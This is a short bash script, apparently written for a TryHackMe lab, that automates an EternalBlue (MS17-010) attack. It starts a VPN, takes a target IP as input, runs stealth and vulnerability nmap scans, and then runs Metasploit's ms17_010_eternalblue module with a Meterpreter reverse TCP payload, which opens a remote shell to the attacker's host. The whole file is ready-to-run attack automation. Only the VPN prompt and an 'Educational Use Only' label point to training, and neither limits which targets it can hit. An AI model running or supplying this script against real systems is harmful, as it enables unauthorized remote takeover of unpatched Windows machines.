#!/bin/bash

# ---------------------------------------------
# Title: EternalBlue Auto Exploit Script + VPN + Nmap Recon
# Author: For Educational Use Only
# ---------------------------------------------

# Step 1: Start VPN
cd /home/kali/Downloads
read -p "[?] Enter path to your TryHackMe .ovpn file: " vpnfile

if [[ ! -f "$vpnfile" ]]; then
    echo "[!] Error: File not found: $vpnfile"
    exit 1
fi

echo "[+] Starting VPN connection..."
sudo openvpn --config "$vpnfile" &
sleep 10  # Give VPN time to establish

# Optional: Confirm VPN is up
echo "[i] VPN started. Checking IP address..."
ip a | grep tun

# Step 2: Get user input
read -p "[?] Enter Target IP (RHOST): " rhost
read -p "[?] Enter Your IP (LHOST): " lhost
read -p "[?] Enter Listening Port (LPORT, default 4444): " lport
lport=${lport:-4444}

# Step 3: Run Nmap scans
echo "[+] Running initial Nmap scan (Stealth, Version, OS, No Ping)..."
nmap -sS -sV -O -Pn "$rhost" -oN initial_scan.txt

echo "[+] Running vulnerability scan with Nmap scripts..."
nmap -sV --script vuln "$rhost" -oN vuln_scan.txt

echo "[i] Nmap scans saved as initial_scan.txt and vuln_scan.txt"
read -p "[*] Press Enter to launch EternalBlue exploit..."

# Step 4: Launch Metasploit with EternalBlue
echo "[+] Launching Metasploit and executing EternalBlue exploit..."
msfconsole -q -x "
use exploit/windows/smb/ms17_010_eternalblue;
set RHOSTS $rhost;
set LHOST $lhost;
set LPORT $lport;
set PAYLOAD windows/x64/meterpreter/reverse_tcp;
exploit;
exit;"
